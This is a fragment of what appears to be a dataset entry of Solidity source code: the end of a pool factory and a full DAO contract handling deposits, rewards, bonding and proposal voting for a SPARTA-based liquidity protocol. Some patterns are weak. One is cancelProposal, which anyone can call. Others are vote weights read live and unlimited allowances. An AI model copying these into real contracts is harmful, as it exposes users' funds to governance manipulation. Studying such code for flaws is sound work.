      iBEP20(_token).transferFrom(msg.sender, _pool, _amount); \n            actual = iBEP20(_token).balanceOf(_pool) - (startBal);\n        }\n    }\n\n    //======================================HELPERS========================================//\n\n    function getPool(address token) public view returns(address pool){\n        if(token == address(0)){\n            pool = mapToken_Pool[WBNB];   // Handle BNB\n        } else {\n            pool = mapToken_Pool[token];  // Handle normal token\n        } \n        return pool;\n    }\n\n    function isPool(address pool) external view returns (bool){\n        if(isListedPool[pool] == true){\n            return true;\n        }\n        return  false;\n    }\n\n    function poolCount() external view returns(uint256){\n        return arrayPools.length;\n    }\n\n    function tokenCount() external view returns(uint256){\n        return arrayTokens.length;\n    }\n\n    function getToken(uint256 i) external view returns(address){\n        return arrayTokens[i];\n    }\n\n    function getPoolArray(uint256 i) external view returns(address){\n        return arrayPools[i];\n    }\n}\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n",
        "CodeNames": [
            "poolFactory.sol",
            "Dao.sol"
        ],
